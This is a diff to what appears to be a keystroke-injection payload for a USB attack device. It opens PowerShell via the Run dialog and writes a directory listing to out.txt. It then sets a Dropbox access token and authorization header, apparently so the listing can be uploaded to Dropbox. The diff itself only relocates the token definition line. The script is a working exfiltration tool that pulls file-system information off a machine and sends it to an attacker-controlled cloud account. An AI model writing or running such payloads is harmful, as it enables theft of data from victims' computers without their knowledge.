@@ -11,9 +11,6 @@
 * Requi*ents:
 *     - Internet connection
 
-* Set yout Dropbox access token
-DEFINE #DROPBOX_ACCESS_TOKEN example
-
 GUI r
 DELAY 1000
 STRING PowerShell
@@ -25,6 +22,8 @@ STRING tree /f /a > out.txt
 ENTER
 STRING $filePath=".\out.txt";
 ENTER
+
+* Set yout Dropbox access token
 STRING $accessToken="#DROPBOX_ACCESS_TOKEN"
 ENTER
 STRING $authHeader = @{Authorization = "Bearer $accessToken"}
